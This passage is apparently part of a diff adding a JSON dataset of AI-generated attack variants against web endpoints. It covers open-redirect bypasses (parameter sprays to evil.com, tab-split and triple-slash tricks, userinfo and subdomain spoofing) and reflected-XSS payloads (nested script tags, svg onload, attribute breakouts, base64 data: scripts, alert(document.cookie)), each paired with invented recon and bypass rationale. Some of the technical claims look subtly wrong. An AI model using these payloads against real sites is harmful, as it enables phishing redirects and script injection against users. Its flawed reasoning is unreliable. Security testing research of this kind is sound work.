+   "recon_evidence": "Source review shows the handler reads several fallback keys (url, next, redirect, redir, rurl, redirect_uri) into one destination variable, and only one of them is actually honored per request; the documented 'dest' key is dead.",
+   "planner_rationale": "Spray every known alias in a single request so the first honored key reveals itself without iterative probing.",
+   "vuln_class": "open_redirect",
+   "payload": "?url=https://evil.com&next=https://evil.com&redirect=https://evil.com&redir=https://evil.com&rurl=https://evil.com&redirect_uri=https://evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "Response 302s to https://evil.com via whichever alias the resolver consumes first",
+   "confidence": 0.82,
+   "reasoning": "Because the handler merges multiple aliases into one destination slot, supplying all of them at once guarantees the live key is populated and exposes the redirect in a single probe."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /news/share?link=",
+   "target_param": "link",
+   "recon_evidence": "The parameter value is rendered into an anchor tag's href on the share preview page with no scheme allow-list, and no server-side 302 is issued for external hosts.",
+   "planner_rationale": "Since navigation happens client-side from a stored href, a script scheme converts the open redirect into in-page script execution.",
+   "vuln_class": "open_redirect",
+   "payload": "javascript:alert(1)",
+   "injection_point": "query",
+   "expected_success_signal": "Clicking the rendered share link runs alert(1) in the origin of the hosting page",
+   "confidence": 0.9,
+   "reasoning": "An unsanitized href sink executes the javascript: scheme on click, which is exactly the JS-variant family for open redirects that never leave the page via HTTP redirect."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /sso/redirect?to=",
+   "target_param": "to",
+   "recon_evidence": "Slash-filtering is active (values with '//' return 400), but a probe containing an encoded tab between the slashes is accepted and echoed verbatim into the Location header.",
+   "planner_rationale": "Split the filtered double slash with a character that normalization silently deletes so validation and final URL disagree.",
+   "vuln_class": "open_redirect",
+   "payload": "/%09/evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "Location header normalizes to //evil.com and the browser navigates off-site to evil.com",
+   "confidence": 0.86,
+   "reasoning": "The 400 on raw '//' versus acceptance of the tab-separated form shows the filter runs pre-normalization, so stripping %09 at redirect time reconstructs the blocked protocol-relative URL."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /logout?next=",
+   "target_param": "next",
+   "recon_evidence": "Behavioral tests show the logout flow honours whichever redirect key is present, with 'next' working in some flows while 'redirect' and 'url' work in others; no single name is documented as canonical.",
+   "planner_rationale": "Cover all common redirect parameter names together to find the live one when recon is ambiguous about naming.",
+   "vuln_class": "open_redirect",
+   "payload": "?url=https://evil.com&next=https://evil.com&redirect=https://evil.com&redir=https://evil.com&rurl=https://evil.com&redirect_uri=https://evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "At least one parameter is consumed and the post-logout response 302s to https://evil.com",
+   "confidence": 0.78,
+   "reasoning": "With multiple candidate names routing to the same variable and no canonical key identified, a combined probe identifies the accepted parameter in one request while confirming the redirect sink."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /auth/post_login",
+   "target_param": "return",
+   "recon_evidence": "The post-login redirect handler rejects return values that omit the https scheme and rejects plain '..' path segments, but a single decode pass is observed on the Location header (a request to /auth/post_login?return=https:///app/%61 shows the once-decoded value echoed in the Location).",
+   "planner_rationale": "Triple-slash plus encoded dot segments re-form the attacker authority after the validator's single decode.",
+   "vuln_class": "open_redirect",
+   "payload": "https:///evil.com/%2e%2e",
+   "injection_point": "query",
+   "expected_success_signal": "302 Location header resolves to evil.com and the browser lands on the attacker host after login",
+   "confidence": 0.85,
+   "reasoning": "The validator's prefix and dot checks operate on the raw value while normalization happens later; the triple-slash form keeps the string scheme-shaped and the encoded dot-dot segment survives the single decode, normalizing to the attacker authority in the browser."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /r/track_click",
+   "target_param": "dest",
+   "recon_evidence": "The click-tracking route forwards dest into its 302 after a check that the value starts with 'https:///' and contains no bare dot-dot sequence; encoded traversal was observed passing through untouched in a previous redirect cycle.",
+   "planner_rationale": "Encoded double-dot segments evade the literal-dot blacklist and normalize to the attacker host client-side.",
+   "vuln_class": "open_redirect",
+   "payload": "https:///evil.com/%2e%2e",
+   "injection_point": "query",
+   "expected_success_signal": "The tracking 302 chains to evil.com instead of returning to the in-app destination",
+   "confidence": 0.78,
+   "reasoning": "A literal substring blacklist for '..' does not catch the percent-encoded form, and the empty-authority triple-slash scheme lets the value pass the https prefix check while the browser resolves the trailing attacker authority."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /session/refresh",
+   "target_param": "return_to",
+   "recon_evidence": "After a refresh, the endpoint sets a return_to cookie echoed from the request and later reads it to build the post-refresh 302 destination; the decoded value is concatenated without host validation.",
+   "planner_rationale": "Persist the attacker destination in the refresh cookie so the later redirect step consumes the tainted value.",
+   "vuln_class": "open_redirect",
+   "payload": "http://2130706433/",
+   "injection_point": "cookie",
+   "expected_success_signal": "Post-refresh 302 Location is http://2130706433/ and the browser resolves it to the loopback host",
+   "confidence": 0.64,
+   "reasoning": "The refresh flow round-trips return_to through a cookie and uses it unvalidated when composing the eventual redirect, so the decimal-loopback value reaches the browser as a destination. The cookie-mediated hop and reliance on the endpoint's own filter make this less certain than a direct query reflection."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /oauth/authorize",
+   "target_param": "redirect_uri",
+   "recon_evidence": "Server compares the resolved callback host against the literal string 'localhost' and rejects any mismatch, with no normalization of a trailing root label.",
+   "planner_rationale": "Append the trailing dot so DNS resolution still lands on localhost while the exact string compare fails to match.",
+   "vuln_class": "open_redirect",
+   "payload": "http://LOCALHOST./",
+   "injection_point": "query",
+   "expected_success_signal": "Callback completes against localhost even though the validator reported an exact-host mismatch",
+   "confidence": 0.9,
+   "reasoning": "A trailing dot makes the host a fully-qualified name that DNS resolves identically to localhost, but an exact-match validator sees a different string, which is precisely the observed comparison behaviour."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /out/link",
+   "target_param": "target",
+   "recon_evidence": "Filter succeeds whenever the trusted hostname appears anywhere in the parameter value; no check is made of the registrable domain actually being resolved.",
+   "planner_rationale": "Embed the trusted name as a subdomain label of an attacker-controlled zone to satisfy the substring rule.",
+   "vuln_class": "open_redirect",
+   "payload": "https://trusted.example.evil.example/",
+   "injection_point": "path",
+   "expected_success_signal": "Redirect Location resolves under evil.example while the filter logs a trusted-domain match",
+   "confidence": 0.88,
+   "reasoning": "Suffixing the attacker's zone with the trusted label keeps the trusted substring intact, yet DNS resolution is delegated to evil.example, which matches the observed prefix/suffix matching behaviour."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /sso/return",
+   "target_param": "Referer",
+   "recon_evidence": "The return handler reads the Referer header and compares its host component exactly against 'localhost' before issuing the follow-up redirect.",
+   "planner_rationale": "Supply a trailing-dot localhost URL in the header so the header-sourced host fails the exact comparison yet still resolves locally.",
+   "vuln_class": "open_redirect",
+   "payload": "http://LOCALHOST./",
+   "injection_point": "header",
+   "expected_success_signal": "Follow-up navigation is issued to localhost despite the header host failing exact equality",
+   "confidence": 0.72,
+   "reasoning": "The same trailing-dot/casing asymmetry applies to header-derived hosts, but the mechanism relies on the header actually being consumed for redirect construction, which recon only inferred indirectly."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /shop/checkout/return",
+   "target_param": "post_login_url",
+   "recon_evidence": "A 'destination not allowed' response is returned only when the configured trusted domain is missing from the stored cookie value; no authority parsing is performed.",
+   "planner_rationale": "Reuse the userinfo trick inside the cookie-stored URL so the contains-check passes on the trusted name.",
+   "vuln_class": "open_redirect",
+   "payload": "https://trusted.example@evil.example/",
+   "injection_point": "cookie",
+   "expected_success_signal": "Checkout return issues a 302 to evil.example without the destination-not-allowed response",
+   "confidence": 0.83,
+   "reasoning": "The cookie value passes the substring allow-list because it contains 'trusted.example', while URL parsing assigns evil.example as the authority, matching the observed contains-only validation."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /redirect/http://evil.example",
+   "target_param": "path (tail after /redirect/)",
+   "recon_evidence": "GET /redirect/ answers 302 with Location: /home, GET /redirect/settings/profile answers 302 with Location: /settings/profile, and GET /redirect//evil.example answers 302 with Location: //evil.example — the handler copies everything after /redirect/ into Location with no scheme or host validation, so a protocol-relative target is accepted.",
+   "planner_rationale": "Path-based redirector that echoes its tail verbatim; anchor the absolute attacker URL as the tail so the Location header resolves off-site.",
+   "vuln_class": "open_redirect",
+   "payload": "/redirect/http://evil.example",
+   "injection_point": "path",
+   "expected_success_signal": "302 response with Location: http://evil.example and no validation error page or allowlist rejection",
+   "confidence": 0.86,
+   "reasoning": "Because the route extracts everything after /redirect/ and emits it as the Location value unmodified, a request path of /redirect/http://evil.example yields Location: http://evil.example, and the browser follows it straight to the attacker host. The observed acceptance of //evil.example confirms there is no destination validation at all."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /auth/mfa/verify",
+   "target_param": "next",
+   "recon_evidence": "GET /auth/mfa/verify?next=/dashboard returns 302 with Location: /dashboard and no allowlist check, and the same binary exposes a /redirect/<tail> route whose 302 Location equals the raw tail (/redirect/foo -> Location: /foo).",
+   "planner_rationale": "next is reflected straight into the Location header, so chain through the app's own path redirector to convert an in-site path into an off-site absolute URL.",
+   "vuln_class": "open_redirect",
+   "payload": "/redirect/http://evil.example",
+   "injection_point": "query",
+   "expected_success_signal": "Hop 1: 302 with Location: /redirect/http://evil.example; hop 2 on /redirect/: 302 with Location: http://evil.example",
+   "confidence": 0.8,
+   "reasoning": "The verified step reflects the next parameter unfiltered into the Location header, and the application's own /redirect/ handler treats its tail as the destination, so /redirect/http://evil.example resolves on the second hop to an absolute off-site URL that never appears in the first response's target."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /billing/portal/return",
+   "target_param": "relay",
+   "recon_evidence": "The relay validator is a prefix test for https://app.example.com only — it inspects neither the path nor the query string, so https://app.example.com/anything passes — and GET /logout?next=//evil.example on that same origin returns 302 with Location: //evil.example.",
+   "planner_rationale": "Host-prefix allowlist plus a self-referencing redirect sink on an allowed path bypasses the check without ever leaving the allowlisted host string.",
+   "vuln_class": "open_redirect",
+   "payload": "https://app.example.com/logout?next=//evil.example",
+   "injection_point": "query",
+   "expected_success_signal": "relay accepted by the prefix check; following the redirect returns 302 Location: //evil.example, which the browser resolves as protocol-relative to evil.example",
+   "confidence": 0.78,
+   "reasoning": "The filter only verifies the https://app.example.com prefix, so an allowed-host URL carrying its own next= parameter passes verbatim; the second hop through /logout then emits a protocol-relative Location, which is treated as off-site."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /markdown/preview",
+   "target_param": "src",
+   "recon_evidence": "The src check requires an allowed authority name immediately after the scheme (whitelisted.com must appear in the host slot of the raw value) and never percent-decodes before copying src into the client-side preview bootstrap; no request is issued to the referenced host, confirming the value is consumed as script rather than fetched.",
+   "planner_rationale": "Keep a whitelisted host name in the authority slot the validator inspects, and park the executable statement after the query separator behind a JS line comment.",
+   "vuln_class": "open_redirect",
+   "payload": "javascript://whitelisted.com?%a0alert%281%29",
+   "injection_point": "query",
+   "expected_success_signal": "Validator returns 200 with no rejection; the injected script context executes alert(1) because //whitelisted.com is consumed as a line comment",
+   "confidence": 0.7,
+   "reasoning": "In a javascript: URL the // after the scheme starts a line comment, so the validator's authority check reads whitelisted.com while the payload sits after the ? separator; the %a0 decodes to a non-breaking space that ends the comment, so the percent-encoded alert(1) parses as the next statement and runs. Confidence is capped because the renderer's decode order is inferred rather than observed."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /portal/entry",
+   "target_param": "X-Original-URL",
+   "recon_evidence": "Requests to /portal/entry without the header land on /portal/home, while the same request with X-Original-URL: https://app.example.com/admin returns 302 whose Location mirrors the header value, indicating the fronting gateway honours the override header when choosing the post-login redirect.",
+   "planner_rationale": "Spoof the gateway override header to control the post-authentication Location while still satisfying the host allowlist with an app-owned URL.",
+   "vuln_class": "open_redirect",
+   "payload": "https://app.example.com/logout?next=//evil.example",
+   "injection_point": "header",
+   "expected_success_signal": "302 Location: https://app.example.com/logout?next=//evil.example; the followed request returns 302 Location: //evil.example",
+   "confidence": 0.57,
+   "reasoning": "If the override header is copied into the Location header, the allowlisted-host prefix test passes on our attacker-chosen value; because /logout on that host exposes its own next= redirect, the second hop lands off-site. Confidence is low because the header-override behaviour is inferred from a single observed mirroring response."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /products/view?name=wireless+mouse",
+   "target_param": "name",
+   "recon_evidence": "The name value is interpolated directly into the product detail heading with no HTML encoding; a probe of name=<b>x</b> rendered as bold text, confirming angle brackets survive.",
+   "planner_rationale": "Raw HTML context with unescaped reflection, so a first script tag injection is warranted before escalating.",
+   "vuln_class": "xss_reflected",
+   "payload": "<script>alert(1)</script>",
+   "injection_point": "query",
+   "expected_success_signal": "alert(1) fires when the product page renders, proving the script element was parsed from reflected input",
+   "confidence": 0.85,
+   "reasoning": "Reflection of raw angle brackets inside HTML element content means a newly opened script tag will be parsed and executed exactly as in the canonical first shot case. No evidence of filtering was observed, so the simplest verbatim payload applies."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /newsletter/subscribe",
+   "target_param": "email",
+   "recon_evidence": "The subscription email value is echoed in a 'Thanks, <value> is on the list' banner; a probe containing <script> returned a 400 with 'disallowed tag: script', but <img> tags passed through to the rendered response.",
+   "planner_rationale": "Script tags are blocked but event-bearing elements are not, so an img onerror handler is the correct bypass.",
+   "vuln_class": "xss_reflected",
+   "payload": "<img src=x onerror=alert(1)>",
+   "injection_point": "body",
+   "expected_success_signal": "alert(1) fires on the confirmation page because the img with src=x fails to load and triggers the onerror handler",
+   "confidence": 0.8,
+   "reasoning": "The blacklist explicitly rejects 'script' while permitting img tags, which is precisely the filter profile an img onerror payload is designed for. The handler executes without any script tag, so the blocklist never engages."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /profiles/lookup?handle=team_alpha",
+   "target_param": "handle",
+   "recon_evidence": "Handle reflection is HTML-safe but a tag-name filter rejects every documented element name (script, img, svg) tested against it; custom/unknown tags such as <x> are returned verbatim in the response.",
+   "planner_rationale": "With all standard tag names filtered, an invented tag carrying onfocus plus tabindex and a fragment anchor is the viable route.",
+   "vuln_class": "xss_reflected",
+   "payload": "<xss id=x onfocus=alert(document.cookie) tabindex=1>#x",
+   "injection_point": "query",
+   "expected_success_signal": "alert(document.cookie) fires after navigation because the URL fragment #x focuses the custom element with matching id, invoking onfocus",
+   "confidence": 0.7,
+   "reasoning": "Unknown tag names survive the filter, and an invented element with an id is still legitimized by element.focus when the fragment points to it. tabindex=1 makes the arbitrary tag focusable, so the onfocus handler executes without any known tag name being present."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /blog/preview?draft=hello+world",
+   "target_param": "draft",
+   "recon_evidence": "Draft preview reflects input unescaped inside a <div> in the editor preview pane; no security testing was observed and raw tag probes of <b> and <script> both rendered, though the pane loads in a fresh context so a pop of alert still identifies the flaw.",
+   "planner_rationale": "Unfiltered raw HTML reflection means the canonical script tag should be confirmed first.",
+   "vuln_class": "xss_reflected",
+   "payload": "<script>alert(1)</script>",
+   "injection_point": "query",
+   "expected_success_signal": "alert(1) fires when the draft preview loads a user-supplied key maintained in the session",
+   "confidence": 0.75,
+   "reasoning": "Both bold and script tag probes rendered in the preview DOM, confirming browser-served raw HTML parsing of the reflection. The script tag payload is the minimal direct confirmation for an unfiltered context."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v2/feedback/submit",
+   "target_param": "comment",
+   "recon_evidence": "The comment body is sanitized by a client-side blacklist that strips <script> and </script> tokens in one pass, but the raw value is still reflected into the server-rendered 'Preview your feedback' panel with no output encoding.",
+   "planner_rationale": "Single-pass tag stripping is bypassable with a nested tag; submit the nested variant in the JSON body and watch the preview panel.",
+   "vuln_class": "xss_reflected",
+   "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+   "injection_point": "body",
+   "expected_success_signal": "alert(1) fires in the feedback-preview panel even though the filter reported the script tag as removed",
+   "confidence": 0.86,
+   "reasoning": "The blacklist deletes the inner <script> token in a single pass, leaving the residual 'scr...ipt' halves to concatenate into a live tag. The body reflection is unencoded, so the reassembled tag parses normally."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /user/profile",
+   "target_param": "display_name",
+   "recon_evidence": "Any literal space in display_name is stripped from the echoed 'Welcome back, <name>' banner, but the filter does not touch slashes or control characters between attributes.",
+   "planner_rationale": "Space removal only — use the slash-separated svg onload form which needs no whitespace.",
+   "vuln_class": "xss_reflected",
+   "payload": "<svg/onload=alert(1)>",
+   "injection_point": "query",
+   "expected_success_signal": "alert(1) executes as the profile page renders the greeting banner, with no spaces present in the request",
+   "confidence": 0.9,
+   "reasoning": "The observed filter strips only the space character, and / is a valid HTML attribute separator inside a tag. The svg/onload form needs no whitespace, so it survives the transform and the reflected banner executes it."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /store/search",
+   "target_param": "ref",
+   "recon_evidence": "The ref query value is echoed into the 'Results for: ...' heading and the parameter is hard-capped at 30 characters by the frontend maxlength plus a trims long inputs server-side.",
+   "planner_rationale": "Hard 30-char budget rules out long payloads; pick the shortest parenless svg execution form.",
+   "vuln_class": "xss_reflected",
+   "payload": "<svg/onload=alert``>",
+   "injection_point": "query",
+   "expected_success_signal": "alert dialog appears from the reflected search heading despite the ~24-char payload fitting under the limit",
+   "confidence": 0.78,
+   "reasoning": "Backticks are a valid tag-invocation syntax for alert, dropping the parentheses and bringing the whole payload under the 30-character cap. The heading is reflected unencoded, so the shortened tag still parses and fires."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /u/{username}",
+   "target_param": "username",
+   "recon_evidence": "The path segment is URL-decoded by the router and echoed verbatim into a <title> and an inline 'Profile: X' <div>; no HTML entities are applied and no length cap exists on path segments.",
+   "planner_rationale": "Path reflection into a raw HTML context — reuse the nested-tag trick against the same single-pass script stripper seen in the WAF logs.",
+   "vuln_class": "xss_reflected",
+   "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+   "injection_point": "path",
+   "expected_success_signal": "alert(1) fires when the /u/<payload> route renders the profile container",
+   "confidence": 0.68,
+   "reasoning": "The path segment is decoded then reflected unencoded into HTML, and the WAF's single-pass <script> removal leaves the nested halves intact. The reflection sits inside an element body, so the reassembled tag executes."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /dashboard",
+   "target_param": "X-Return-To",
+   "recon_evidence": "The X-Return-To request header is copied into a hidden input value and a visible 'Returning to <value>' link on the dashboard; spaces in the header are collapsed to nothing before reflection.",
+   "planner_rationale": "Header reflection with whitespace stripping — the slash-separated svg onload form needs no spaces and survives the collapse.",
+   "vuln_class": "xss_reflected",
+   "payload": "<svg/onload=alert(1)>",
+   "injection_point": "header",
+   "expected_success_signal": "alert(1) executes on /dashboard when the crafted X-Return-To header is replayed via curl",
+   "confidence": 0.82,
+   "reasoning": "Whitespace collapse does not affect a payload that already uses / as the attribute separator. Since the header value is reflected into the dashboard markup without entity encoding, the svg onload handler executes."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /search",
+   "target_param": "q",
+   "recon_evidence": "The q value is reflected inside the quoted value attribute of a hidden input in the search results page; the double quote is not encoded and no CSP header is present.",
+   "planner_rationale": "Escape the attribute context and auto-fire an event that needs no user interaction.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" autofocus onfocus=alert(document.domain) x=\"",
+   "injection_point": "query",
+   "expected_success_signal": "alert fires on automatic focus after page load",
+   "confidence": 0.9,
+   "reasoning": "The reflection sits in a quoted attribute with an unencoded double quote, so closing the value and appending autofocus/onfocus yields script execution without a click; the trailing x= keeps the tag well-formed."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /feedback",
+   "target_param": "ticket",
+   "recon_evidence": "The ticket value is reflected inside a quoted attribute of an anchor tag, but the > character is HTML-encoded, so the tag cannot be exited; quotes pass through unencoded.",
+   "planner_rationale": "Since '>' is encoded, stay inside the tag and trigger the handler via a fragment reference to an injected id.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" onfocus=alert(1) id=x tabindex=0 style=display:block>#x",
+   "injection_point": "query",
+   "expected_success_signal": "Fragment #x focuses the injected id and alert fires",
+   "confidence": 0.82,
+   "reasoning": "With '>' encoded the payload never leaves the tag, so the documented tag-trapped variant adds an event handler plus a displayable, focusable element; the #x fragment then focuses that id and fires the handler."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /newsletter/confirm",
+   "target_param": "subscriber_token",
+   "recon_evidence": "The subscriber_token from the form body is reflected back into the confirmation page inside the quoted value attribute of a hidden input; double quotes are not encoded in the reflection.",
+   "planner_rationale": "Reflected body parameter lands in an attribute sink, so escape the attribute and auto-fire the focus event.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" autofocus onfocus=alert(document.domain) x=\"",
+   "injection_point": "body",
+   "expected_success_signal": "alert fires on automatic focus after page load",
+   "confidence": 0.86,
+   "reasoning": "The POST body parameter is echoed unencoded into a quoted attribute of the confirmation response, so closing the attribute and injecting autofocus/onfocus executes in document.domain context without any interaction."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /account/prefs",
+   "target_param": "theme (Cookie)",
+   "recon_evidence": "The theme cookie is reflected into a quoted attribute of a link element used for theming; the > character is HTML-encoded in the reflection while double quotes pass through unencoded.",
+   "planner_rationale": "Cookie-controlled attribute context with '>' encoded: remain inside the tag and focus an injected id via the URL fragment.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" onfocus=alert(1) id=x tabindex=0 style=display:block>#x",
+   "injection_point": "cookie",
+   "expected_success_signal": "Fragment #x focuses the injected id and alert fires",
+   "confidence": 0.74,
+   "reasoning": "The cookie value reaches a quoted attribute where '>' is encoded, ruling out tag exit; the tag-trapped payload attaches onfocus plus a focusable id, and the #x fragment triggers it, though cookie reflection paths make this slightly more speculative."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /auth/sso/continue",
+   "target_param": "return_to",
+   "recon_evidence": "GET /auth/sso/continue?return_to=x returns HTTP 200 whose HTML contains <a id=\"ret\" href=\"x\">; a follow-up with a literal 'script' substring was rewritten to 'scr_ipt' by the app, but the href value is never scheme-validated and no CSP blocks navigation to data: URIs.",
+   "planner_rationale": "Attribute context in href survived keyword neutering, so ship the script as an encoded data: document instead of plaintext markup.",
+   "vuln_class": "xss_reflected",
+   "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=",
+   "injection_point": "query",
+   "expected_success_signal": "Clicking the decoded 'Continue' link renders the base64 page and alert('Hello') executes in the app origin",
+   "confidence": 0.82,
+   "reasoning": "The parameter is concatenated unescaped into a single-quoted href attribute and the server only mutates plaintext 'script' substrings; base64 hides the token from that filter while the browser still decodes and executes the data: document, so no tag breakout is required."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /dashboard",
+   "target_param": "ui_theme",
+   "recon_evidence": "Requesting /dashboard with cookie ui_theme=\"dark\" returns HTML containing <input type=\"hidden\" name=\"ui_theme\" value=\"dark\"> in the persisted-preferences form; error pages and CSP headers show script-src 'self' with no inline allowance, and no popover attributes are reflected on the page.",
+   "planner_rationale": "CSP kills inline handlers in new tags but accesskey still lets us hijack a keypress on an element we fully control inside the hidden input.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" accesskey=\"X\" onclick=\"alert(1)\" x=\"",
+   "injection_point": "cookie",
+   "expected_success_signal": "Pressing ALT+SHIFT+X (macOS: CTRL+OPTION+X) on the dashboard triggers the handler and alert fires",
+   "confidence": 0.63,
+   "reasoning": "The cookie value is echoed into a hidden input's value attribute, so a closing quote plus accesskey/onclick injects a focusable element that executes on the accesskey combination; the payload depends on the user's modifier keypress and on no CSP nonce requirement, which is only partially confirmed."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /docs/{version}/redir",
+   "target_param": "version",
+   "recon_evidence": "Requesting /docs/v2.1.0/redir returns HTTP 302 with a Location built from the path segment, and the 404 fallback page for /docs/<segment>/redir echoes the segment into <a class=\"doc-next\" href=\"\">Go to docs</a>; the WAF rejects path segments containing '<' or '>' with a 403 but ignores base64 blobs.",
+   "planner_rationale": "Path segments are pre-validated against angle brackets, so escape validation entirely with a base64 data: document in an href sink.",
+   "vuln_class": "xss_reflected",
+   "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=",
+   "injection_point": "path",
+   "expected_success_signal": "Following the reflected 'Go to docs' link decodes and runs the script page, showing alert('Hello')",
+   "confidence": 0.71,
+   "reasoning": "The reflected path segment lands inside an href attribute and the WAF's filter only rejects literal angle brackets, which the base64 payload never contains; once the URL is percent-decoded into the href, the browser treats it as a data: document and executes the embedded script."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /catalog/search?kw=tshirt",
+   "target_param": "kw",
+   "recon_evidence": "Sending kw='><x shows the value reflected inside the onfocus attribute of the auto-suggest input, built as onfocus='track(\"kw=...\")'-style markup; quote characters come back HTML-encoded (&apos;) and angle brackets are stripped, but the event attribute itself stays intact and unterminated.",
+   "planner_rationale": "HTML entities decode at attribute-parse time before JS evaluation, so encoded quotes behave like raw breakouts inside event handlers.",
+   "vuln_class": "xss_reflected",
+   "payload": "&apos;-alert(1)-&apos;",
+   "injection_point": "query",
+   "expected_success_signal": "alert(1) fires when the suggestion field gains focus; the &apos; entities resolved to real quotes before JS evaluation.",
+   "confidence": 0.85,
+   "reasoning": "The reflection sits inside a single-quoted event handler whose quote characters are entity-encoded rather than removed. Because character references decode before the attribute's JavaScript is compiled, the encoded breakout is functionally identical to one using raw quotes."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /newsletter/subscribe",
+   "target_param": "email",
+   "recon_evidence": "POST /newsletter/subscribe with email=a'b returns a confirmation row whose label element carries the value inside a paired-quote onmouseover tooltip attribute; quotes surface HTML-encoded and tag-breakout attempts are blocked, leaving runtime entity decoding as the only route out of the attribute.",
+   "planner_rationale": "Runtime attribute decoding makes entity-encoded quotes equal to raw quote breakouts inside event handlers.",
+   "vuln_class": "xss_reflected",
+   "payload": "&apos;-alert(1)-&apos;",
+   "injection_point": "body",
